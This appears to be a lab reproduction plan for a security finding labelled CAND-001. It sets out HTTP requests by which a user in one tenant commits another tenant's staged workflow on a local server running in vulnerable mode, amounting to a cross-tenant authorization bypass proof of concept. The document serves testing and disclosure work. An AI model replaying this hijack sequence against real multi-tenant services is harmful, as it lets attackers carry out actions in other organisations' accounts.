# Reproduction Steps & Execution Plan: CAND-001

## Prerequisites
- Lab server running in vulnerable mode on `http://127.0.0.1:8888`
- Identities:
  - Identity A (Victim): `alice_admin` (Tenant A)
  - Identity B (Attacker): `bob_user` (Tenant B)

## Step-by-Step Reproduction Procedure
1. **Authenticate Identity A:**
   ```bash
   POST /api/auth/login {"username": "alice_admin", "password": "pass123"}
   Extract Token A.
   ```
2. **Authenticate Identity B:**
   ```bash
   POST /api/auth/login {"username": "bob_user", "password": "pass123"}
   Extract Token B.
   ```
3. **Initiate Workflow under Tenant A:**
   ```bash
   POST /api/workflow/initiate
   Headers: Authorization: Bearer <Token_A>
   Body: {"payload": {"contract_amount": 500000, "action": "EXECUTIVE_APPROVAL"}}
   Extract workflow_id (e.g., wf-1771687...-a1b2).
   ```
4. **Trigger Async Compensation / Rollback:**
   ```bash
   POST /api/workflow/stage
   Headers: Authorization: Bearer <Token_A>
   Body: {"workflow_id": "<workflow_id>", "action": "rollback"}
   Assert response status: 200 OK, status: "STAGED_AWAITING_RETRY".
   ```
5. **Execute Hijack Commit under Tenant B Identity:**
   ```bash
   POST /api/workflow/commit
   Headers: Authorization: Bearer <Token_B>
   Body: {"workflow_id": "<workflow_id>"}
   Assert response status: 200 OK.
   Assert payload contains "original_tenant": "tenant_a" and "executing_actor": "bob_user".
   ```
